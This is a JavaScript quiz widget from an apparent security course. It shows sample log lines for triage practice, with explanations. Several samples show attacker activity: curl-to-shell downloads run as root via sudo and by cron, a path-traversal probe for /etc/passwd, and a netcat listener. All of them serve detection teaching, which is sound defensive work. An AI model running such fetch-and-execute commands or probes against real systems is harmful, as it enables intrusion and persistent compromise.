/* Security part: log triage drill. Read one real-format log line at a time and decide: normal, noise, or investigate now. */
(function () {
  'use strict';
  if (!window.__core) return;
  var K = window.__core, $ = K.$, esc = K.esc, h = K.h, W = window.__widgets = window.__widgets || {};
  var ITEMS = [
    ['auth.log on a Raspberry Pi', 'Nov 17 08:01:02 pi sshd[3120]: Accepted publickey for learner from 192.168.1.23 port 52211 ssh2: ED25519 SHA256:D3GZuVzJm2EQTXV4Jl0NxcA6rISiWMZInk9GkZZ5EEA', 'ok',
      'Your own key, from your own Mac\'s LAN address, for your own user. This is what a healthy SSH login looks like.'],
    ['auth.log on a Raspberry Pi', 'Nov 17 03:12:44 pi sshd[2211]: Failed password for invalid user admin from 45.95.147.12 port 51022 ssh2', 'noise',
      'Internet scanners try usernames like admin all day, and the attempt failed. But notice what it reveals: "Failed password" means password logins are still enabled. Set PasswordAuthentication no and the noise turns into instant rejections.'],
    ['auth.log on a Raspberry Pi', 'Nov 17 03:40:19 pi sshd[2290]: Accepted password for root from 185.220.101.4 port 40112 ssh2', 'inv',
      'A successful root login, with a password, from an internet address you do not recognise, at 03:40. Treat the machine as compromised: disconnect it, look at what happened next (sudo, cron, new users, new keys in authorized_keys), and rebuild from a known-good image.'],
    ['auth.log on a Raspberry Pi', 'Nov 17 09:15:30 pi sudo:  learner : TTY=pts/0 ; PWD=/home/learner ; USER=root ; COMMAND=/usr/bin/apt update', 'ok',
      'You, in an interactive terminal (pts/0), updating packages during the day. Exactly what sudo logging is for: a record of who became root and why.'],
    ['auth.log on a web server', 'Nov 17 03:41:02 web sudo: www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -s http://203.0.113.99/x.sh | sh', 'inv',
      'The web server\'s own account, with no terminal, working in /tmp, piping a downloaded script into a root shell. That is an attacker who got code execution through the web app, then privileges through a sudo rule. www-data should never be in sudoers.'],
    ['nginx access.log', '203.0.113.77 - - [17/Nov/2026:10:14:09 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 404 153 "-" "Mozilla/5.0"', 'noise',
      'A path-traversal probe: it tries to read /etc/passwd through a page parameter. The 404 shows it failed here. Note the IP and watch for a pattern, but one failed probe is internet background noise.'],
    ['nginx access.log', '198.51.100.7 - - [17/Nov/2026:10:14:12 +0000] "GET /static/app.css HTTP/2.0" 200 8812 "https://app.lab.example/" "Mozilla/5.0 (Macintosh)"', 'ok',
      'A browser loading a stylesheet that your own page links to (see the Referer). Normal traffic.'],
    ['output of: awk \'$9 == 401 {print $1, $6, $7}\' access.log | sort | uniq -c | sort -rn | head -1', '    412 203.0.113.77 "POST /api/login', 'inv',
      '412 failed logins against one endpoint from one address is credential stuffing in progress. Act now: rate-limit or block the address, check whether any of its attempts succeeded (a 200 after the 401s), and make sure accounts lock or slow down after repeated failures.'],
    ['ls -l ~/Library/LaunchAgents on a Mac', 'com.apple.updater.plist    ProgramArguments: /Users/learner/.cache/.u/agent    RunAtLoad: true    KeepAlive: true', 'inv',
      'Apple does not install agents in your user LaunchAgents folder, and nothing legitimate runs a hidden binary from ~/.cache/.u. A fake Apple name plus persistence is a classic malware pattern. Unload it, keep a copy of the binary for analysis, and find out how it arrived.'],
    ['ls -l /Library/LaunchDaemons on a Mac', 'com.docker.vmnetd.plist    ProgramArguments: /Library/PrivilegedHelperTools/com.docker.vmnetd', 'ok',
      'Docker Desktop\'s networking helper, installed when you approved Docker\'s privileged helper. Expected if you use Docker. If you never installed Docker, it would be worth a question.'],
    ['sudo lsof -nP -iTCP -sTCP:LISTEN on a Mac', 'nc        4410 learner    3u  IPv4 0x6c2f1d0a3b9e5f21      0t0  TCP *:4444 (LISTEN)', 'inv',
      'netcat listening on every interface on port 4444, the default port of a well-known exploitation framework. Unless you started it a minute ago for a lab, something is offering a shell to the network. Find the parent process (ps -o ppid= -p 4410) and kill it.'],
    ['crontab -l for the user www-data', '*/5 * * * * curl -fsSL http://198.51.100.66/u | bash', 'inv',
      'Every five minutes, download and run whatever a remote server says, as the web user. That is persistence: even after you fix the bug that let them in, this re-infects the machine. Remove it, and check every other crontab and systemd timer.'],
    ['journalctl on a Raspberry Pi', 'Nov 17 02:17:01 pi CRON[1990]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)', 'ok',
      'Debian\'s stock hourly cron job, which runs at 17 minutes past every hour. Root running it is normal.'],
    ['kernel log on a firewall', 'Nov 17 10:20:33 pi kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.66 DST=192.168.1.50 LEN=44 TTL=41 PROTO=TCP SPT=40123 DPT=3389 WINDOW=1024 SYN', 'noise',
      'The firewall dropped a SYN to RDP (3389). The tiny window and the TTL are typical of a scanner. Blocked, logged, nothing to do unless the volume changes or the source is inside your own network.']
  ];
  var CH = { ok: 'Normal', noise: 'Noise: failed or blocked', inv: 'Investigate now' };
  W.triage = function () {
    var r = h('div', { class: 'wg sv sec' }); r.style.setProperty('--dom', 'var(--c-sec)');
    r.innerHTML = '<h4>Log triage: normal, noise, or investigate now?</h4><p class="sub">Every line below is in the exact format the real tool writes. Decide what each means before reading the explanation. Analysts spend most of their day doing exactly this; the skill is telling the three apart quickly.</p>';
    var order = ITEMS.map(function (_, i) { return i; }), i = 0, score = 0, answered = false;
    for (var k = order.length - 1; k > 0; k--) { var j = (k * 7 + 3) % (k + 1), t = order[k]; order[k] = order[j]; order[j] = t; }
    var b = h('div', { html: '<div class="tg-hd" id="hd"></div><div id="card"></div>' }); r.appendChild(b);
    function draw() {
      if (i >= order.length) {
        $('#hd', b).innerHTML = '';
        $('#card', b).innerHTML = '<p class="tg-done"><b>' + score + ' of ' + order.length + '</b> correct. ' + (score >= 12 ? 'That is analyst-level triage.' : score >= 9 ? 'Solid. Re-read the ones you missed: the difference between noise and an incident is usually one detail, such as Accepted versus Failed.' : 'Go through the explanations again; the patterns repeat in every real log.') + '</p><button class="btn sec" id="again">Start again</button>';
        return;
      }
      var it = ITEMS[order[i]];
      $('#hd', b).innerHTML = '<span>Line <b>' + (i + 1) + '</b> of ' + order.length + '</span><span>Score <b>' + score + '</b></span>';
      $('#card', b).innerHTML = '<span class="tg-src">' + esc(it[0]) + '</span><pre class="tg-line">' + esc(it[1]) + '</pre><div class="tg-btns">' +
        Object.keys(CH).map(function (k) { return '<button class="btn' + (k === 'inv' ? ' sus' : ' sec') + '" data-k="' + k + '">' + CH[k] + '</button>'; }).join('') + '</div><div class="tg-fb" id="fb" aria-live="polite"></div>';
      answered = false;
    }
    b.addEventListener('click', function (e) {
      var t = e.target.closest('button'); if (!t) return;
      if (t.id === 'again') { i = 0; score = 0; draw(); return; }
      if (t.id === 'next') { i++; draw(); return; }
      var k = t.getAttribute('data-k'); if (!k || answered) return;
      answered = true; var it = ITEMS[order[i]], good = k === it[2]; if (good) score++;
      $('#fb', b).innerHTML = '<p><span class="' + (good ? 'ok">✓ Right' : 'no">✗ It is: ' + CH[it[2]]) + '</span>. ' + esc(it[3]) + '</p><button class="btn" id="next">' + (i + 1 < order.length ? 'Next line' : 'See my score') + '</button>';
      $('#hd', b).innerHTML = '<span>Line <b>' + (i + 1) + '</b> of ' + order.length + '</span><span>Score <b>' + score + '</b></span>';
    });
    draw();
    return r;
  };
})();
